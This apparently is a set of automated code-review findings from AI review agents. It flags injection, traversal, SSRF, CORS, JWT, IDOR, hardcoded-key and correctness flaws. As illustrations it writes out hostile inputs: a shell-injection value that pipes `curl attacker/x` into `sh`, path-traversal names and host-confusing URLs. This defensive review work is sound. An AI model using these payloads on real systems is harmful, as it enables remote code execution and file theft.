findings.title: Renaming `page_size` to `limit` breaks keyword-argument callers
findings.body: `list_invoices` is a public-looking function in `api/`; any existing caller invoking it as `list_invoices(tenant_id, page_size=100)` will now raise `TypeError: unexpected keyword argument 'page_size'`. No callers were retrieved, so this could not be verified — please grep for `page_size=` at call sites of `list_invoices`, and if external consumers exist, either keep `page_size` as a deprecated alias or bump the API version.

findings.title: Docstring still documents the removed `page_size` parameter
findings.body:
The parameter was renamed to `limit` on line 1, but the Args block still lists `page_size`. Update the docstring entry to `limit: how many invoices to return.` so the documented contract matches the signature. (Note also that the PR description says the rename is `page` → `offset`, which does not match what the code does — worth confirming the intended name before merging.)

_Also raised by the docs agent:_ Docstring still documents removed parameter page_size

findings.title: Absolute `from adapters import HTTPAdapter` will fail at import time
findings.body: `sessions.py` lives inside the `requests` package and every other import in this module is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). A bare `from adapters import HTTPAdapter` only resolves under Python 2 implicit relative imports, and even there it risks picking up an unrelated top-level `adapters` module. Under Python 3 this raises `ModuleNotFoundError` at `import requests`, breaking the whole library. Use `from .adapters import HTTPAdapter`.

findings.title: verify/cert accepted but never applied — TLS verification silently dropped
findings.body:
The new `request()` signature still advertises `verify=None` and `cert=None`, but neither value is ever written onto `req` nor passed into `self.send(prep)` / `adapter.send(request)`. Every caller that pins a CA bundle (`verify='/etc/ssl/corp-ca.pem'`), enables verification explicitly, or supplies a client certificate for mutual TLS now gets whatever the freshly constructed `HTTPAdapter()` defaults to, with no error and no warning.

The adversary is a network attacker on the path between the client and the server (hostile Wi‑Fi, a compromised upstream proxy, DNS spoofing). They control the TLS peer certificate presented to the client. If the adapter's default is not to verify — or not to verify against the caller's bundle — they get a full MITM: plaintext read/write of every request, including `Authorization` headers and cookies that this same method attaches.

Either thread `verify`/`cert` through `prepare()`/`send()`, or — if the adapter is not ready yet — raise `NotImplementedError` when they are non-`None` so the loss of the control is loud rather than silent.

findings.title: New `request()` accepts but silently ignores most of its parameters
findings.body:
The new `request()` keeps the full public signature (`timeout`, `verify`, `cert`, `prefetch`, `config`, `return_response`) but never uses any of them — they are accepted and dropped. In addition, unlike the `old_request` path it does no merging with session-level state: `self.headers`, `self.cookies`, `self.auth`, `self.params`, `self.hooks`, `self.verify`, `self.cert` and `self.config` are all bypassed, so `Session(headers=...)` / `session.auth = ...` stop having any effect, and `return_response=False` now returns a response anyway. This is a silent behaviour change for every existing caller of `Session.request` and the module-level `get/post/...` helpers, which pass these kwargs through. Either wire the arguments through to `prepare()`/`send()` or fail loudly while the refactor is in progress.

_Also raised by the security agent:_ timeout parameter ignored — remote server can hang the client indefinitely

findings.title: `_send_request` is deleted but still called by `old_request`
findings.body: The diff removes the `_send_request` method, yet the surviving `old_request` body still ends with `return self._send_request(r, **args)`. Any call that reaches `old_request` now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep `_send_request` until `old_request` is removed, or delete `old_request` in the same change.

findings.title: A new HTTPAdapter (and pool) per send, with close() now a no-op
findings.body: `send()` instantiates a fresh `HTTPAdapter()` on every request. Since the adapter owns the PoolManager that `Session` used to own, each request gets its own connection pool, so connection reuse/keep-alive is lost and the sockets from previous requests are never returned to a shared pool. At the same time `close()` was reduced to `pass`, so nothing is ever cleared — `Session.close()` and the `with Session()` context manager silently stop releasing connections. Hold a single adapter on the session (created in `__init__`) and have `close()` call its `close()`/`clear()`. Note also that removing `init_poolmanager()` breaks any caller or subclass that overrode it to customise pooling.

findings.title: close() now does nothing but no test would catch a resource leak
findings.body: close() was changed from actually clearing the poolmanager to a bare `pass`. If this is not later filled in with adapter-based cleanup, connections will leak silently. There is no test in this diff (or apparently in the existing suite, based on what's shown) that exercises Session.close() and verifies underlying connections/pools are actually released.

findings.title: New adapter-based send path is untested in this change
findings.body: Session.send now delegates to a freshly introduced HTTPAdapter().send(request) instead of request.send(). This is a core behavior change to how every request is actually dispatched, but no test in this diff exercises it, so a broken HTTPAdapter.send or a wrong PreparedRequest/Response contract between Session and HTTPAdapter would not be caught by anything shown here.

findings.title: Malformed Cookie header now caches None, breaking all cookie callers
findings.body:
On a parse failure the new property assigns `self._cookies = None` and returns it. Because `_cookies` is now set, the `hasattr` guard short-circuits on every subsequent access, so `request.cookies` is permanently `None` for that request. The two updated callers both assume a mapping: `get_cookie` does `if name in self.request.cookies` (TypeError: argument of type 'NoneType' is not iterable) and `clear_all_cookies` does `self.request.cookies.iterkeys()` (AttributeError). The previous code never returned a non-mapping — it kept the (partially loaded) `SimpleCookie` and called `clear_all_cookies()`. Keep the empty/partial `SimpleCookie` on failure, e.g. `self._cookies = Cookie.SimpleCookie()` in the except branch, and if the response-side clearing behaviour is still wanted, re-add it at the `RequestHandler` level where `clear_cookie` is available.

_Also raised by the security agent:_ Malformed Cookie header makes cookies None, crashing all cookie readers

findings.title: RequestHandler.cookies removed with no alias to request.cookies
findings.body: `RequestHandler.cookies` is a public, documented attribute; deleting it breaks any subclass, mixin or template that reads `self.cookies` / `handler.cookies` with an AttributeError at request time. The move is fine, but keep a thin forwarding property on `RequestHandler` (`@property def cookies(self): return self.request.cookies`) so existing callers keep working.

findings.title: No test covers the new cookies property's changed error-handling behavior
findings.body: The old RequestHandler.cookies property caught malformed Cookie headers by calling self.clear_all_cookies(), whereas the new HTTPRequest.cookies property sets self._cookies = None on the same exception. Downstream callers such as web.py's get_cookie (`name in self.request.cookies`) and clear_all_cookies (`self.request.cookies.iterkeys()`) will now raise a TypeError when parsing fails, instead of the old behavior. Nothing in this diff exercises a malformed Cookie header, so this regression would pass unnoticed.

findings.title: Missing strip() makes boundary lookup fail for normal headers
findings.body:
`content_type.split(";")` yields segments that retain the space after the semicolon, e.g. `" boundary=----WebKitFormBoundaryXyz"`. `field.partition("=")` then produces `k == " boundary"`, which never equals `"boundary"`, so the loop completes without breaking and control falls into the `for ... else` at line 366, logging "Invalid multipart/form-data" and silently discarding the body. Since nearly every client sends `Content-Type: multipart/form-data; boundary=...` with the conventional space, this disables multipart parsing entirely — a regression against the old `'boundary=' in content_type` check, which was whitespace-insensitive.

Fix: `k, sep, v = field.strip().partition("=")` (and consider stripping surrounding quotes from `v`, since RFC 2045 permits `boundary="..."`).

findings.title: No test exercises boundary parsing when it isn't the last Content-Type field
findings.body: The change fixes a real bug (assuming 'boundary' is the last parameter in the Content-Type header), but no test asserts that multipart bodies are parsed correctly when boundary appears before other parameters (e.g. 'multipart/form-data; charset=utf-8; boundary=xyz'). If this logic regresses (e.g. back to the old split-on-boundary= approach, or an off-by-one in partition handling), nothing would fail.

findings.title: get_host ignores '?' and '#' delimiters, enabling host-parser differential
findings.body:
`get_host` splits only on `://`, `/`, `@` and `:`. A URL whose authority is terminated by `?` or `#` is parsed differently from RFC 3986 / `urllib.parse`:

- `get_host('http://trusted.example#@evil.example/')` → there is no `/` before the `@`, so the `@` branch on line 94 strips `trusted.example#` and returns host `evil.example`.
- `get_host('http://trusted.example?@evil.example/')` behaves the same way.

A standards-compliant parser (and every browser) resolves both to `trusted.example`. The adversary is any user who can supply a URL to an application that validates the destination with `urlparse`/`urlsplit` against an allowlist and then passes the original string to urllib3 (webhook targets, link previewers, image fetchers, open-redirect followers). What they control is the whole URL string; what they get is a connection to a host of their choosing — i.e. the SSRF allowlist is bypassed and internal services become reachable.

Fix by truncating at the first `?` or `#` before touching `@`/`:`, or by delegating to `urllib.parse.urlsplit` and taking `hostname`/`port` from it.

Secondarily, the host returned on line 104 is never checked for control characters or whitespace; if a caller places it into a request line or `Host:` header without its own validation, a URL containing `%0d%0a`-decoded bytes becomes header injection. That half depends on downstream code not shown here.

findings.title: LocationParseError message has an unsubstituted %s placeholder
findings.body: `raise LocationParseError("Failed to parse: %s")` never interpolates anything, so every parse failure surfaces the literal string `Failed to parse: %s` and the caller loses the only piece of information that makes the error actionable. It should be `raise LocationParseError("Failed to parse: %s" % url)` (or `% port`, if the intent is to report the bad port component). Any test or log scraper that expects the URL in the message will also be broken by this.

findings.title: accept_encoding: non-`str` text values silently become 'gzip,deflate'
findings.body: The branch chain treats anything that is neither `str` nor `list` as "truthy boolean" and overwrites it with `'gzip,deflate'`. On Python 2 — which this module clearly targets, given the `six` import on line 16 and `six.b(...)` on line 68 — a caller passing a `unicode` literal (e.g. `make_headers(accept_encoding=u'identity')`) falls into the `else` branch and gets `gzip,deflate` instead of the value they asked for, with no error. Tuples/other sequences behave the same way. Consider testing against `six.string_types` and joining any non-string iterable.

findings.title: No visible test coverage for make_headers logic branches
findings.body: make_headers contains multiple conditional branches (string/list/bool accept_encoding, basic_auth base64 encoding) that determine header output. No test file is included in this diff, and no repository context was retrieved showing existing tests for this function. If this is a pure lift-and-shift from an existing tested module, this is not a gap; if the refactor changed behavior, nothing here would catch a regression.

findings.title: No visible test coverage for get_host URL parsing edge cases
findings.body: get_host parses scheme/host/port with several sequential string-split operations and a LocationParseError branch for non-digit ports. Without a test file in this diff or confirmed repository context, a regression in parsing order or the error path would not be caught by anything shown here.

findings.title: httpx 0.27→0.28 is a minor bump with API removals, not a patch
findings.body:
The PR describes this as "the latest patch", but `>=0.27` → `>=0.28` crosses a minor boundary. httpx 0.28.0 removed several long-deprecated interfaces (notably the `proxies=` argument on `Client`/`AsyncClient`, the `app=` shortcut in favour of explicit `WSGITransport`/`ASGITransport`, and changes to `verify`/`cert` handling). Since the constraint is an open lower bound, every install after this merge resolves to 0.28+, so any code still using those arguments will fail at construction time rather than at test-collection time.

Before merging, grep the codebase for `httpx.Client(`/`httpx.AsyncClient(` with `proxies=`, `app=`, or `cert=` and confirm none are present — and consider an upper bound (`>=0.28,<0.29`) so the next minor cannot land unreviewed the same way.

findings.title: `self.location` changes from str to URL, breaking documented contract
findings.body:
Previously `self.location` held exactly the value passed in by the caller (a `str` in the common case). After this change it holds `URL(location)`. The documented contract in `docs/web_reference.rst` states the attribute is "the location the response redirects to, **as the string it was constructed with**", and that application code compares it against configured strings and passes it to `str.startswith`. A `yarl.URL` has no `startswith`, so such callers raise `AttributeError`, and `exc.location == "/login"` silently becomes `False` because `URL.__eq__` does not compare equal to a plain string. `URL()` also normalises (e.g. percent-encoding, trailing-slash/path handling), so even `str(exc.location)` may not round-trip the original input.

If reuse of the parsed value is the goal, keep the public attribute a string and use a separate local/private for the parsed URL, e.g.:

```python
url = URL(location)
self.headers['Location'] = str(url)
self.location = location
```

Otherwise this needs a documented, versioned API change.

_Also raised by the security agent:_ location changes from str to URL, breaking string-based redirect checks

findings.title: self.location now a URL object, contradicting documented string contract
findings.body: docs/web_reference.rst states: "The location the response redirects to, **as the string it was constructed with**. Application code compares it against configured strings and passes it to ``str.startswith``." This diff assigns `self.location = URL(location)` instead of the raw string, so `self.location` is now a `yarl.URL` instance, not the original string. Code relying on the documented contract (equality against configured strings, `str.startswith`) will break, since `URL` does not support `.startswith` and its `__eq__`/`__str__` behavior differs from plain strings. Either update the docstring to reflect the new type, or preserve the original string assignment alongside the parsed URL used for the header.

findings.title: No test guards location attribute's documented string type
findings.body: The change assigns `self.location = URL(location)` instead of the original string, which contradicts the documented contract in docs/web_reference.rst stating location is 'the string it was constructed with' and is used with str.startswith by application code. No test in this diff (or apparently in the existing suite, since none is touched) asserts the type or string-compatibility of `self.location`, so this regression would pass silently.

findings.title: readany can return b'' before EOF after single-wait change
findings.body:
`_wait()` is documented to resolve not only on `feed_data()`/`feed_eof()` but also at the end of a chunk, which can happen with an empty buffer — hence the docstring's instruction that "a caller must re-check its condition after waking rather than assuming data arrived". The `while` loop was that re-check. With `if`, a single spurious/end-of-chunk wake falls straight through to `self._read_nowait(-1)` on line 8, which returns an empty bytes object while `self._eof` is still False.

That breaks `readany`'s contract: the conventional consumer pattern is `while True: chunk = await resp.content.readany(); if not chunk: break`, so an empty return is read as end-of-stream and the remainder of the body is silently truncated. Restore the `while` loop (or re-check `self._buffer`/`self._eof` after the await and loop until one is true).

_Also raised by the security agent:_ Single wait can return empty bytes, which callers read as EOF

findings.title: No test guards against spurious/no-data wakeups after while->if change
findings.body: The change replaces a `while not self._buffer and not self._eof` loop with a single `if`, meaning the code now waits only once even though the retrieved docstring for `_wait` explicitly states the waiter can resolve with no new data in the buffer ('a caller must re-check its condition after waking rather than assuming data arrived'). If that scenario occurs, `readany` would now return prematurely via `_read_nowait(-1)` with an empty buffer, whereas the old loop would re-wait. No test file is included in this diff to exercise the case where `_wait` resolves without new buffer data (e.g. simulating a feed_eof-adjacent wakeup with no bytes fed), so this behavior change is not covered.

findings.title: `from adapters import HTTPAdapter` breaks package import
findings.body: `adapters` is a sibling module inside the `requests` package, not a top-level module. Dropping the leading dot makes this an absolute import, which under Python 3 (and under Python 2 with `from __future__ import absolute_import`) resolves against `sys.path` rather than the package directory. Unless a top-level `adapters` module happens to be importable — and if one is, it is the wrong module — this raises `ImportError`/`ModuleNotFoundError` the moment `requests.sessions` is loaded, i.e. on `import requests`. The adjacent line 6 (`from .packages.urllib3.poolmanager import PoolManager`) shows the package's own convention. Restore the dot: `from .adapters import HTTPAdapter`.

findings.title: Unqualified import lets a sys.path-writable attacker hijack HTTPAdapter
findings.body:
`from .adapters import HTTPAdapter` unambiguously resolves to the module inside the `requests` package. `from adapters import HTTPAdapter` resolves through `sys.path` — on Python 2 it happens to fall back to the sibling module, and on Python 3 it only resolves if some `sys.path` entry contains an `adapters` module. Either way the name is no longer bound to the package.

Adversary: any local principal who can write to a directory that appears on `sys.path` ahead of the package directory — typically the process's working directory or script directory (`''`/`sys.path[0]`), or a world-writable directory injected via `PYTHONPATH`. What they control: the entire contents of `adapters.py`. What they get: arbitrary code executed at import time in every process that imports `requests.sessions`, plus control of the `HTTPAdapter` class that performs TLS verification and connection pooling — so they can silently disable certificate verification or exfiltrate request bodies and credentials for all outbound HTTP.

This is a library shipped to arbitrary applications, so the writable-directory precondition is not under the library's control. Restore the explicit relative import (`from .adapters import HTTPAdapter`) or use the fully qualified absolute form (`from requests.adapters import HTTPAdapter`).

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body:
The PR premise ("cookies is always a mapping after construction") contradicts the retrieved `HTTPRequest.cookies` property, which returns `None` when the Cookie header is present but unparseable, and whose docstring states "every consumer has to allow for that". With the guard removed, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable`, turning a malformed client-supplied Cookie header into a 500 on any handler that calls `get_cookie` (including secure-cookie / XSRF paths that build on it). Restore the guard, or change the property to return `{}` instead of `None` (a wider, separate change affecting all consumers).

_Also raised by the tests agent:_ No test covers get_cookie when request.cookies is None

findings.title: Removed None guard lets a malformed Cookie header crash every handler
findings.body:
`self.request.cookies` is not always a mapping. The `cookies` property in `tornado/httpserver.py` explicitly returns `None` when the `Cookie` header is present but cannot be parsed, and its docstring states "every consumer has to allow for that". With the guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the `Cookie` request header, fully controlled by any unauthenticated remote client. Sink: the membership test on line 3, reached by every handler that calls `get_cookie` / `get_secure_cookie` (including the XSRF cookie path). Impact: a single malformed Cookie header turns any such request into an unhandled exception and a 500, so a trivially cheap request can be used to spray errors across the application and pollute logs; behaviour also changes from "treated as no cookie" to "request fails".

Either restore the `is not None` check here, or change the `cookies` property to return `{}` instead of `None` so the invariant the commit message assumes actually holds.

findings.title: Dropping .strip() makes boundary parsing fail for normal headers
findings.body: `content_type.split(";")` leaves the whitespace that conventionally follows the semicolon, so for the standard header `multipart/form-data; boundary=----abc` the second element is `" boundary=----abc"`. With `.strip()` removed, `partition("=")` yields `k == " boundary"`, which fails the `k == "boundary"` comparison on line 5, so `_parse_mime_body` is never called and the multipart body is silently discarded (no arguments/files parsed, no error raised). The `.strip()` was not redundant — it normalised the key, not just the value. Restore `field.strip().partition("=")`, or at minimum strip the key before comparing.

findings.title: Dropping strip() breaks boundary detection; attacker controls whether body is parsed
findings.body:
`content_type.split(";")` yields parameter segments that keep the whitespace after the separator, so for the ordinary header `Content-Type: multipart/form-data; boundary=----abc` the second segment is `" boundary=----abc"`. Without the removed `.strip()`, `partition("=")` returns `k == " boundary"`, the `k == "boundary"` test on line 5 fails, `_parse_mime_body` is never reached, and the request body is silently discarded — no arguments, no files, no error.

Entry point: the client-supplied `Content-Type` request header. Sink: the `_parse_mime_body(v, data)` call on line 6 that populates request arguments/files.

The attacker is any remote client. What they control is the whitespace and ordering of the Content-Type parameters, and therefore whether this server parses the multipart body at all: `...form-data;boundary=X` (no space) still parses, `...form-data; boundary=X` (RFC-normal, one space) does not. What they get is a parser differential — any front-end that parses the header per RFC (a WAF, proxy, upload scanner, or another framework in the same stack) sees and inspects the form fields, while the application behind this code sees an empty argument set, or vice versa. Handlers that treat a missing field as absent-and-default rather than rejecting the request can be steered into the wrong branch. Independently of the security angle this breaks all normal multipart uploads.

Restore the strip on the segment: `k, sep, v = field.strip().partition("=")`. If the intent was only to avoid an extra strip of the *value*, note that the original call strips the whole segment before partitioning, which is what makes the key comparison correct; it is not redundant.

findings.title: No test guards removal of .strip() before 'boundary' key match
findings.body: The diff removes field.strip() before partitioning on '='. Since k == "boundary" is compared with an exact string equality, if a real-world Content-Type header contains a space after the semicolon (e.g. "multipart/form-data; boundary=abc", which is extremely common), k will be " boundary" and the boundary will silently fail to be detected, breaking multipart parsing. No test in this diff exercises a Content-Type value with a leading space in the boundary field, so this regression would not be caught.

findings.title: Dangling %s placeholder leaves URL out of parse error message
findings.body: The `% url` interpolation was removed but the `%s` placeholder was left in the string literal. Every `LocationParseError` raised here now reads literally `Failed to parse: %s`, which both loses the offending URL (making the error undiagnosable from logs) and exposes a raw format placeholder to users. If the intent was to shorten the message, drop the placeholder too, e.g. `raise LocationParseError(url)` or `raise LocationParseError("Failed to parse: %s" % url)` if the URL should be retained.

findings.title: No test exercises the LocationParseError message content
findings.body: The change removes the `% url` substitution, leaving a literal '%s' in the raised message instead of the actual url value. If there is no test asserting on the exception message text (e.g. via pytest.raises with match=, or checking str(exc)), this regression—an unformatted placeholder shown to users—would not be caught by the existing test suite.

findings.title: Error message loses its %s substitution, printing literal '%s'
findings.body: The exception message `"Failed to parse: %s"` no longer has `% url` applied to it, so the raised `LocationParseError` will display the literal text `%s` rather than the URL that failed to parse. This is a user-facing diagnostic string and it now conveys strictly less (and confusing) information than before — anyone reading the exception to see which URL failed will just see '%s'.

findings.title: Shell command injection via interpolated name/directory in create_archive
findings.body:
`cmd` is assembled with an f-string from `name` and `directory` and executed with `shell=True`, so any shell metacharacter in either argument is interpreted. A caller-supplied `directory` of `foo; curl attacker/x | sh` or a `name` of `a$(id)` runs arbitrary commands with the process's privileges.

Fix by dropping the shell and passing an argument list, as `list_exports` on line 5 already does:

```python
subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)
```

That still leaves `name` able to escape `/exports` via `../` — validate it against an allowlist (e.g. `[A-Za-z0-9_-]+`) and resolve the final path under `/exports` before writing.

_Also raised by the correctness agent:_ Unquoted f-string passed to shell=True mis-parses ordinary inputs

findings.title: No test coverage for new create_archive function
findings.body: create_archive builds a shell command via string interpolation and runs it with shell=True, but no test exercises this function. Nothing in the diff would catch a regression in argument handling, quoting, or the injection-prone construction if it were 'fixed' incorrectly, nor would it catch a change that breaks the archive path/name handling.

findings.title: Returns CompletedProcess while sibling function returns bytes
findings.body: `list_exports` returns `.stdout` (bytes), whereas `create_archive` returns the whole `CompletedProcess` object. Callers of this module will see two different return shapes from adjacent functions. Either return something meaningful (e.g. the archive path) or document the difference. Without `capture_output=True`, the returned object's `stdout` is `None` as well, so the value carries little information.

findings.title: origin:"*" with credentials:true cannot work and removes origin checks
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. Per the Fetch spec, a browser rejects any credentialed response whose `Access-Control-Allow-Origin` is the literal `*`; the middleware here will emit exactly that, so the dashboard's cookie-bearing requests will fail in the browser and the stated purpose of the change is not achieved. If instead the underlying `cors` implementation reflects the request `Origin` when `credentials` is set, the result is worse: every origin on the internet becomes an allowed credentialed origin, bypassing the `ALLOWED` list used by the existing export on line 6.

Either way this is wrong. Add the dashboard origin to the existing `ALLOWED` allowlist (or pass an explicit origin/predicate here), and keep `credentials: true` only alongside a concrete origin value.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. The existing export directly above it uses a fixed `ALLOWED` list with credentials, so this new config deliberately removes the origin allowlist for whatever routes it is attached to.

Adversary: any web page the victim visits while holding a valid session cookie for this API. What they control: the `Origin` of the cross-site request and the request path/method. What they get: if the response ACAO is the requesting origin, they read authenticated API responses for the victim's session (and can drive state-changing calls whose responses they can then read).

Note on exactness: with the standard `cors` npm middleware, `origin: "*"` emits a literal `*`, and browsers refuse to expose credentialed responses under a wildcard — so the immediate effect may be that the dashboard simply does not work, pushing someone to "fix" it by reflecting `req.headers.origin`, which is the fully exploitable form. Either way this config should not ship.

Fix: add the dashboard's exact origin to `ALLOWED` and reuse the existing credentialed middleware, rather than introducing a wildcard variant. If multiple origins are needed, use an explicit allowlist function that echoes only origins present in that list.

findings.title: No test guards the wildcard-origin + credentials CORS config
findings.body: The new `dashboardCors` export combines `origin: "*"` with `credentials: true`. Per the CORS spec, browsers reject `Access-Control-Allow-Origin: *` when credentials are allowed, so this configuration is likely non-functional (or, if the underlying `cors` library silently reflects the request origin instead of literally sending '*', it becomes an effectively open credentialed CORS policy for all origins). There is no test in this diff that exercises `dashboardCors` against a request to verify the emitted headers, so a regression or a misconfiguration like this would pass silently.

findings.title: Live AcmePay secret key hardcoded in source, replacing env lookup
findings.body:
`ACMEPAY_SECRET_KEY = "acme_live_..."` embeds what its `acme_live_` prefix identifies as a production payment-processor secret directly in the repository, and `client()` now assigns it to `acmepay.api_key` instead of reading `os.environ["ACMEPAY_SECRET_KEY"]`.

Adversary: anyone with read access to this repository or to any artifact built from it — contractors, CI log scrapers, a forked/mirrored clone, or anyone who obtains the source after a later leak. They control nothing; they simply read the file. What they get: the ability to authenticate to AcmePay as this merchant, i.e. issue charges, refunds, and read customer payment records.

Actions: (1) revert to the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (restoring the removed `import os`); (2) treat this key as compromised the moment it is pushed — rotate it in the AcmePay dashboard; (3) purge it from git history, since removing it in a follow-up commit leaves it readable in the object store.

findings.title: Key no longer environment-configurable; all envs use the live key
findings.body: `client()` previously resolved `acmepay.api_key` from `os.environ["ACMEPAY_SECRET_KEY"]`, so each deployment supplied its own key and a missing key failed loudly at call time. After this change the value is a module-level constant prefixed `acme_live_`, so staging, CI and local runs will all authenticate against the live AcmePay account and issue real charges — the environment variable that operators still set is now silently ignored. Restore the `os.environ` lookup (keeping the KeyError, or using `os.environ.get` with an explicit failure) and remove the literal; the constant also cannot be rotated without a code deploy.

findings.title: client() behavior change is not exercised by any test
findings.body: client() now sets acmepay.api_key = ACMEPAY_SECRET_KEY instead of reading from the environment. No test in this PR (or shown repo context) calls client() and asserts what api_key gets set to. The added fixture file (tests/fixtures/acmepay.py) only defines a fake_client() helper and a TEST_KEY constant — it is never invoked to check client()'s actual behavior. If this line were reverted, changed to read a different variable, or broken in another way, nothing would fail.

findings.title: tenant_of returns an unauthenticated, caller-controlled tenant id
findings.body:
`tenant_of` decodes with `options={"verify_signature": False}` and no key, so the returned `tenant_id` is whatever the bearer of the request wrote in the token body — it is not a verified claim. Any caller that uses this value for tenant scoping (row filtering, routing, quota) will happily act on a forged value, while the sibling `claims_for` on line 7 verifies the RS256 signature against `public_key()`. Make `tenant_of` delegate to `claims_for(token)` and read `tenant_id` from the verified claim set; if the intent was to avoid the key-store round-trip, cache `public_key()` rather than skip verification.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: New tenant_of() function has no accompanying test
findings.body: tenant_of() introduces a new, security-sensitive behavior: it extracts tenant_id from a JWT without verifying the signature. No test file appears in this diff, so nothing would catch a regression such as verification being silently re-enabled (breaking callers who pass tampered tokens), a KeyError if tenant_id is missing, or the wrong claim being read. Add a test that decodes a token with an invalid/unsigned tenant_id claim and asserts tenant_of returns the expected value, plus a test for a token missing the claim.

findings.title: Direct subscript raises KeyError for a token without tenant_id
findings.body: A syntactically valid token that carries no `tenant_id` claim (service tokens, older issuance formats) makes line 12 raise `KeyError`, which callers of an auth helper are unlikely to be catching — it will surface as a 500 rather than a 401/403. Use `unverified.get("tenant_id")` and have the caller handle `None`, or raise a domain-specific auth error.

findings.title: tenant_of name doesn't disclose unverified decode
findings.body: tenant_of(token) reads the tenant id via jwt.decode(token, options={"verify_signature": False}), i.e. without any signature check, but its name gives no hint of that — it reads like a safe sibling of claims_for(token) just above it, which does verify. A caller choosing between the two based on name alone has no way to know tenant_of trusts unverified claims. Consider renaming (e.g. unverified_tenant_of) or adding a short docstring/comment noting the signature is not checked.

findings.title: update_payment_method mutates any user's payment method (missing require_owner)
findings.body:
`update_payment_method` resolves `pm` from the caller-supplied `pm_id` and writes `body["billing_name"]` to it, then persists with `pm.save()` — with no ownership check. The adversary is any authenticated user of the service; they control `pm_id` (and the body), and they get write access to another account's stored payment method, letting them alter the billing name on a card they do not own. That is a straightforward IDOR.

The read path at line 6 already does the right thing (`require_owner(current_user(request), pm)`), and `api/auth.py` documents that "Every object mutation must call this". Note also that `user` is bound on line 11 and never used, which is the tell that the check was intended and dropped. Fix by adding `require_owner(user, pm)` immediately after the `PaymentMethod.get(pm_id)` on line 12, before any attribute assignment.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unguarded body["billing_name"] raises KeyError on partial payload

findings.title: No test would catch missing ownership check on update_payment_method
findings.body: update_payment_method fetches the payment method and saves changes without calling require_owner(user, pm), unlike get (line 6) which does call it. There is no test file in this diff, so a test asserting that a non-owner cannot update another user's payment method does not exist — nothing would fail if this authorization gap were exploited.

findings.title: Rate limit removed from unauthenticated password reset endpoint
findings.body:
`request_reset` is a pre-authentication endpoint: the caller supplies an arbitrary `email` and the handler unconditionally calls `send_reset_email(email)`. With `@rate_limit("5/hour")` gone, a remote unauthenticated attacker can drive this in a loop and get (a) mail-bombing of any victim address they choose, which is also a plausible cover for other account-takeover activity, (b) unbounded generation of reset tokens for a target account, widening the window for token guessing/interception, and (c) free outbound email on your provider account, risking cost and sender-reputation/blocklisting.

The PR rationale ("the email provider already throttles") does not substitute for this control. Provider throttles are applied per *sending* account, so they cap your total send rate but not the per-recipient or per-IP rate an attacker cares about; the attacker still saturates a single victim's inbox, and once the provider-side cap is hit it degrades into a denial of service against legitimate password resets for everyone. Provider throttling also does nothing about the token-churn and enumeration aspects, which never touch the mail transport.

Suggested fix: keep a limiter on this handler, keyed on both source IP and normalised target email (e.g. 5/hour per email, plus a coarser per-IP cap), rather than relying on a downstream service for an application-layer control.

findings.title: No test guards removal of rate limiting on password reset
findings.body: The `@rate_limit("5/hour")` decorator was removed from `request_reset`, but no test file is included in this diff. If a test previously asserted that repeated calls to this endpoint were throttled, it would now need to fail or be removed; since no such test is visible, there is nothing in the current change set that would catch a future accidental removal or reintroduction bug in rate-limiting behavior. If this endpoint's abuse-resistance is relied upon anywhere (e.g., preventing email-bombing via password reset), that guarantee is now unverified by any automated check.

findings.title: Endpoint still reports success once provider-side throttling kicks in
findings.body: The PR's justification is that the email provider throttles instead. That moves the throttling decision from the decorator (which returned a distinct rejection before `send_reset_email` ran) into `send_reset_email` itself. But `request_reset` neither inspects nor guards that call: it unconditionally returns `{"sent": True}`. Under the previous design the limiter short-circuited before the send, so the success shape was accurate; now a provider-level rejection either raises out of the handler as an unhandled error or is silently absorbed, and the caller is told the mail was sent when it was not. If provider throttling is genuinely the replacement control, the handler needs to branch on the outcome of `send_reset_email` and return a throttled/failed result. Note also that provider throttles are typically sender-account-wide rather than per-requester, so one abusive caller exhausting the quota degrades resets for every user, which the per-caller `5/hour` limiter did not allow.

findings.title: Preview path skips _confined(), allowing arbitrary file reads
findings.body:
`read_export` on line 14 normalises the caller-supplied `name` through `_confined()` before opening it. `read_export_preview` builds the path directly with `os.path.join(EXPORT_ROOT, name)` instead. `os.path.join` does not constrain the result: a `name` of `../../etc/passwd` escapes `EXPORT_ROOT` by traversal, and an absolute `name` such as `/etc/passwd` causes `os.path.join` to discard `EXPORT_ROOT` entirely. The first 4096 bytes of any file readable by the process are then returned to the caller.

Route the preview through the same helper as the download path, e.g. `path = _confined(name)` followed by `open(path, "rb").read(limit)`, so both entry points share one containment check rather than two divergent ones.

_Also raised by the security agent:_ Preview path skips _confined(), allowing arbitrary file read

findings.title: No test would catch preview bypassing path confinement
findings.body: read_export_preview builds path via os.path.join(EXPORT_ROOT, name) directly, unlike the sibling function that calls _confined(name). If this behavior is wrong (e.g., allows '../' traversal), nothing in the diff exercises this function, so no existing test would fail if 'name' contained a path-traversal payload.

findings.title: Ownership check removed from bulk_export enables cross-tenant IDOR
findings.body:
`bulk_export` previously called `require_owner(user, report)` for every fetched report; that loop and the `require_owner` import were both deleted. Now `report_ids`, which comes straight from the caller's request, is used to `Report.get(rid)` and the full `to_dict()` payload of every fetched object is returned with no tenant check.

Adversary: any authenticated user of any tenant. What they control: the `report_ids` list (IDs are typically guessable or enumerable). What they get: the full contents of arbitrary other tenants' reports.

Restore the check inside the loop, or push it into the fetch (e.g. query reports filtered by `tenant_id=user.tenant_id` and fail if any requested ID is missing) so the fast path still enforces ownership. Authentication (`current_user`) is not a substitute for authorisation.

_Also raised by the correctness agent:_ bulk_export no longer enforces per-report ownership

findings.title: Removed ownership check has no accompanying regression test
